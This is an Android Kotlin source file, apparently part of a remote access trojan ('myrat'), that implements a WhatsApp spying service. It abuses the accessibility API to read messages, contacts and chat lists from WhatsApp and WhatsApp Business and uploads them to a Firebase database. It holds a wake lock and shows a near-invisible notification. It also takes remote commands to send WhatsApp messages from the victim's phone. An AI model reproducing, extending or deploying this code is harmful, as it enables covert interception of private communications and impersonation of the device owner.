package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap

class WhatsAppService : AccessibilityService() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val messageCache = ConcurrentHashMap<String, Long>()
    private val contactCache = ConcurrentHashMap<String, Boolean>()
    private val valueEventListener = ConcurrentHashMap<String, ValueEventListener>()
    private val CACHE_DURATION = 24 * 60 * 60 * 1000L // 24 hours
    private val NOTIFICATION_ID = 12
    private val CHANNEL_ID = "WhatsAppService"
    private var wakeLock: PowerManager.WakeLock? = null

    companion object {
        const val WHATSAPP_PACKAGE = "com.whatsapp"
        const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
        private const val VIEW_ID_CONVERSATION_LAYOUT = "conversation_layout"
        private const val VIEW_ID_MESSAGE_TEXT = "message_text"
        private const val VIEW_ID_CONVERSATIONS_ROW = "conversations_row"
        private const val VIEW_ID_DATE = "date"
        private const val VIEW_ID_OUTGOING_MSG_INDICATOR = "outgoing_msg_indicator"
        private const val VIEW_ID_QUOTED_MESSAGE = "quoted_message"
        private const val VIEW_ID_CONTACT_NAME = "conversation_contact_name"
        private const val VIEW_ID_LAST_MESSAGE = "conversation_last_message"
        private const val VIEW_ID_UNREAD_COUNT = "unread_count"
        private const val VIEW_ID_SEARCH = "menuitem_search"
        private const val VIEW_ID_SEARCH_INPUT = "search_input"
        private const val VIEW_ID_MESSAGE_ENTRY = "entry"
        private const val VIEW_ID_SEND = "send"
    }

    override fun onCreate() {
        super.onCreate()
        try {
            // Acquire wake lock to ensure WhatsApp monitoring works even when screen is off
            acquireWakeLock()
            
            deviceId = MainActivity.getDeviceId(this)
            Logger.log("WhatsAppService started for deviceId: $deviceId")
            startForegroundService()
            setupAccessibilityService()
            loadKnownContacts()
            scheduleCacheCleanup()
            listenForSendMessageCommands()
        } catch (e: Exception) {
            Logger.error("Failed to create WhatsAppService", e)
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "WhatsAppService:KeepAlive"
            )
            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
            Logger.log("Wake lock acquired for WhatsAppService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock for WhatsApp", e)
        }
    }

    private fun startForegroundService() {
        try {
            val channelName = "WhatsApp Monitoring Service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_MIN
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("WhatsApp Monitor")
                .setContentText("Monitoring WhatsApp and WhatsApp Business")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .setShowWhen(false)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()

            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start WhatsApp foreground service", e)
        }
    }

    private fun setupAccessibilityService() {
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                packageNames = arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE)
            }
            serviceInfo = info
        } catch (e: Exception) {
            Logger.error("Failed to setup accessibility service", e)
        }
    }

    private fun scheduleCacheCleanup() {
        scope.launch {
            try {
                while (isActive) {
                    delay(60_000)
                    val now = System.currentTimeMillis()
                    val removedEntries = messageCache.entries.filter { now - it.value > CACHE_DURATION }
                    removedEntries.forEach { messageCache.remove(it.key) }
                    if (removedEntries.isNotEmpty()) {
                        Logger.log("Cache cleaned, removed ${removedEntries.size} entries, size: ${messageCache.size}")
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in cache cleanup", e)
            }
        }
    }

    private fun loadKnownContacts() {
        try {
            db.child("Device").child(deviceId).child("whatsapp/contacts")
                .get().addOnSuccessListener { snapshot ->
                    snapshot.children.forEach { contact ->
                        contactCache[contact.key!!] = true
                    }
                    Logger.log("Loaded ${contactCache.size} known contacts")
                }.addOnFailureListener { e ->
                    Logger.log("Failed to load contacts: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Error loading known contacts", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (event.packageName != WHATSAPP_PACKAGE && event.packageName != WHATSAPP_BUSINESS_PACKAGE) return

        scope.launch {
            try {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                        handleContentChange(event)
                    }
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                        handleWindowStateChange(event)
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error processing accessibility event: ${e.message}", e)
            }
        }
    }

    private fun handleContentChange(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            if (!isChatScreen(rootNode, event.packageName.toString())) return

            val messageNodes = findMessageNodes(rootNode, event.packageName.toString())
            messageNodes.forEach { node ->
                extractAndUploadMessage(node, event.packageName.toString())
            }
            extractChatMetadata(rootNode, event.packageName.toString())
        } catch (e: Exception) {
            Logger.error("Error handling content change", e)
        }
    }

    private fun handleWindowStateChange(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            if (isChatListScreen(rootNode, event.packageName.toString())) {
                extractChatListData(rootNode, event.packageName.toString())
            } else if (isChatScreen(rootNode, event.packageName.toString())) {
                extractChatMetadata(rootNode, event.packageName.toString())
            }
        } catch (e: Exception) {
            Logger.error("Error handling window state change", e)
        }
    }

    private fun isChatScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_CONVERSATION_LAYOUT"
            ).isNotEmpty()
        } catch (e: Exception) {
            Logger.error("Error checking if chat screen", e)
            false
        }
    }

    private fun isChatListScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_CONVERSATIONS_ROW"
            ).isNotEmpty()
        } catch (e: Exception) {
            Logger.error("Error checking if chat list screen", e)
            false
        }
    }

    private fun findMessageNodes(rootNode: AccessibilityNodeInfo, packageName: String): List<AccessibilityNodeInfo> {
        return try {
            rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_MESSAGE_TEXT"
            )
        } catch (e: Exception) {
            Logger.error("Error finding message nodes", e)
            emptyList()
        }
    }

    private fun extractAndUploadMessage(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val messageText = node.text?.toString() ?: return
            if (messageText.isBlank()) return
            
            val parent = node.parent ?: return
            val timestampNode = parent.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_DATE"
            ).firstOrNull()
            val timestamp = timestampNode?.text?.toString()?.let { parseTimestamp(it) } ?: System.currentTimeMillis()

            val direction = if (parent.findAccessibilityNodeInfosByViewId(
                    "$packageName:id/$VIEW_ID_OUTGOING_MSG_INDICATOR"
                ).isNotEmpty()) {
                "Sent"
            } else {
                "Received"
            }

            val chatName = getCurrentChatName(packageName) ?: "Unknown"
            val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
            if (isNewContact) {
                contactCache[chatName] = true
                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
                    .setValue(mapOf(
                        "dpUrl" to getContactDp(chatName, packageName),
                        "firstSeen" to System.currentTimeMillis()
                    ))
            }

            // Enhanced message ID generation to prevent duplicates
            val messageId = generateMessageId(chatName, messageText, timestamp, packageName, direction)
            if (messageCache.containsKey(messageId)) {
                Logger.log("Duplicate message detected, skipping: $messageId")
                return
            }
            messageCache[messageId] = timestamp

            val messageData = mapOf(
                "sender" to (if (direction == "Sent") "You" else chatName),
                "recipient" to (if (direction == "Sent") chatName else "You"),
                "content" to messageText,
                "timestamp" to timestamp,
                "type" to if (isReplyMessage(parent, packageName)) "Reply" else direction,
                "isNewContact" to isNewContact,
                "uploaded" to System.currentTimeMillis(),
                "messageId" to messageId,
                "packageName" to packageName,
                "direction" to direction
            )

            Logger.log("New message: ${messageData["type"]} from ${messageData["sender"]} ($packageName)")
            uploadMessage(messageData)
        } catch (e: Exception) {
            Logger.error("Error extracting and uploading message", e)
        }
    }

    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String, direction: String): String {
        return try {
            val input = "$sender$text$timestamp$packageName$direction${System.currentTimeMillis()}"
            MessageDigest.getInstance("SHA-256")
                .digest(input.toByteArray())
                .joinToString("") { "%02x".format(it) }
                .substring(0, 32)
        } catch (e: Exception) {
            Logger.error("Error generating message ID", e)
            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
        }
    }

    private fun parseTimestamp(timestampStr: String): Long {
        return try {
            // Simple timestamp parsing - can be enhanced based on actual format
            System.currentTimeMillis()
        } catch (e: Exception) {
            System.currentTimeMillis()
        }
    }

    private fun isReplyMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            parent.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_QUOTED_MESSAGE"
            ).isNotEmpty()
        } catch (e: Exception) {
            false
        }
    }

    private fun getCurrentChatName(packageName: String): String? {
        return try {
            val rootNode = rootInActiveWindow ?: return null
            val titleNode = rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_CONTACT_NAME"
            ).firstOrNull()
            titleNode?.text?.toString()
        } catch (e: Exception) {
            Logger.error("Error getting current chat name", e)
            null
        }
    }

    private fun getContactDp(contactName: String, packageName: String): String {
        // Placeholder for contact DP - implement based on requirements
        Logger.log("DP access for $contactName ($packageName) - placeholder implementation")
        return ""
    }

    private fun uploadMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("whatsapp/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("Message uploaded: ${message["content"]} (${message["packageName"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading message", e)
            }
        }
    }

    private fun extractChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatNodes = rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_CONVERSATIONS_ROW"
            )
            val chats = mutableListOf<Map<String, Any>>()

            chatNodes.forEach { chatNode ->
                val name = chatNode.findAccessibilityNodeInfosByViewId(
                    "$packageName:id/$VIEW_ID_CONTACT_NAME"
                ).firstOrNull()?.text?.toString() ?: ""
                val lastMessage = chatNode.findAccessibilityNodeInfosByViewId(
                    "$packageName:id/$VIEW_ID_LAST_MESSAGE"
                ).firstOrNull()?.text?.toString() ?: ""
                val timestamp = chatNode.findAccessibilityNodeInfosByViewId(
                    "$packageName:id/$VIEW_ID_DATE"
                ).firstOrNull()?.text?.toString()?.let { parseTimestamp(it) } ?: 0L
                val unreadCount = chatNode.findAccessibilityNodeInfosByViewId(
                    "$packageName:id/$VIEW_ID_UNREAD_COUNT"
                ).firstOrNull()?.text?.toString()?.toIntOrNull() ?: 0

                if (name.isNotEmpty()) {
                    chats.add(mapOf(
                        "name" to name,
                        "lastMessage" to lastMessage,
                        "timestamp" to timestamp,
                        "unreadCount" to unreadCount,
                        "packageName" to packageName
                    ))
                }
            }

            if (chats.isNotEmpty()) {
                db.child("Device").child(deviceId).child("whatsapp/chats").setValue(chats)
                    .addOnSuccessListener {
                        Logger.log("Chat list uploaded: ${chats.size} chats ($packageName)")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload chat list ($packageName): ${e.message}", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat list data", e)
        }
    }

    private fun extractChatMetadata(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatName = getCurrentChatName(packageName) ?: return
            val dpUrl = getContactDp(chatName, packageName)
            if (dpUrl.isNotEmpty()) {
                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
                    .setValue(mapOf("dpUrl" to dpUrl))
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat metadata", e)
        }
    }

    private fun listenForSendMessageCommands() {
        try {
            val sendRef = db.child("Device").child(deviceId).child("whatsapp/commands")
            val listener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { command ->
                            val number = command.child("number").getValue(String::class.java) ?: return@forEach
                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
                            val packageName = command.child("packageName").getValue(String::class.java) ?: WHATSAPP_PACKAGE
                            Logger.log("Received send command for $number: $message ($packageName)")
                            scope.launch {
                                sendWhatsAppMessage(number, message, packageName)
                            }
                            command.ref.removeValue()
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing send commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Failed to read send command: ${error.message}")
                }
            }
            valueEventListener["sendCommands"] = listener
            sendRef.addValueEventListener(listener)
        } catch (e: Exception) {
            Logger.error("Error setting up send message commands listener", e)
        }
    }

    private suspend fun sendWhatsAppMessage(recipient: String, message: String, packageName: String) {
        try {
            // Open WhatsApp or WhatsApp Business
            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            } ?: run {
                Logger.error("$packageName not installed")
                return
            }
            startActivity(intent)
            delay(2000)

            val rootNode = rootInActiveWindow ?: return
            val searchButton = rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_SEARCH"
            ).firstOrNull()
            searchButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            delay(1000)

            val searchField = rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_SEARCH_INPUT"
            ).firstOrNull()
            searchField?.let {
                val args = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient)
                }
                it.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            } ?: run {
                Logger.error("Search field not found ($packageName)")
                return
            }
            delay(1000)

            val contactResult = rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_CONTACT_NAME"
            ).firstOrNull()
            contactResult?.performAction(AccessibilityNodeInfo.ACTION_CLICK) ?: run {
                Logger.error("Contact result not found ($packageName)")
                return
            }
            delay(1000)

            val messageInput = rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_MESSAGE_ENTRY"
            ).firstOrNull()
            messageInput?.let {
                val args = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message)
                }
                it.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            } ?: run {
                Logger.error("Message input not found ($packageName)")
                return
            }
            delay(500)

            val sendButton = rootNode.findAccessibilityNodeInfosByViewId(
                "$packageName:id/$VIEW_ID_SEND"
            ).firstOrNull()
            sendButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK) ?: run {
                Logger.error("Send button not found ($packageName)")
                return
            }
            Logger.log("Sent message to $recipient ($packageName)")

            // Log sent message with unique ID to prevent duplicates
            val messageData = mapOf(
                "sender" to "You",
                "recipient" to recipient,
                "content" to message,
                "timestamp" to System.currentTimeMillis(),
                "type" to "Sent",
                "isNewContact" to !contactCache.containsKey(recipient),
                "uploaded" to System.currentTimeMillis(),
                "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
                "packageName" to packageName,
                "direction" to "Sent"
            )
            uploadMessage(messageData)
        } catch (e: Exception) {
            Logger.error("Error sending message ($packageName): ${e.message}", e)
        }
    }

    override fun onInterrupt() {
        Logger.log("WhatsAppService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            // Release wake lock
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            
            scope.cancel()
            valueEventListener.forEach { (_, listener) ->
                db.child("Device").child(deviceId).child("whatsapp/commands")
                    .removeEventListener(listener)
            }
            valueEventListener.clear()
            Logger.log("WhatsAppService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying WhatsAppService", e)
        }
    }
}